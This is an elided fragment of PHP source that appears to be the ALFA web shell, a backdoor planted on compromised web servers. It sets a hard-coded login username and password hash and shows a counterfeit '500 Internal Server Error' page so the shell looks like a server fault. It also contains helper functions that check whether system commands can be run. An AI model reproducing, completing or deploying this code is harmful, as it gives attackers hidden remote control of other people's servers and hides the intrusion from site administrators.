...
$GLOBALS['oZgNypoPRU'] = array(
    'username' => 'Mikel998@',
    'password' => '93b81cf2d719bd828d7e587e950c2356',
    'safe_mode' => '1',
    'login_page' => '403',
    'show_icons' => '0',
...
echo '<html><head><title>500 Internal Server Error</title></head><body><h1>Internal Server Error</h1><p>The server encountered an internal error or misconfiguration and was unable to complete your request.</p><p>Please contact theserver administrator, '.$_SERVER['SERVER_ADMIN'].' and inform them of the time the error occurred, and anything you might have done that may have caused the error.</p><p>More information about this error may be available in the server error log.</p><hr>'.$SERVER_SIG.'</body></html>'.$Eform;
exit;
}
	...
	foreach($GLOBALS['__ALFA_COLOR__'] as $key => $value){
		if(!is_array($value)){
			...
			if(isset($value["multi_selector"])){
				foreach($value["multi_selector"] as $k => $v){$color = alfa_getColor($key);
...
function _alfa_is_dir($dir,$mode="-d"){
	...
	if(!$check){if(_alfa_can_runCommand()){
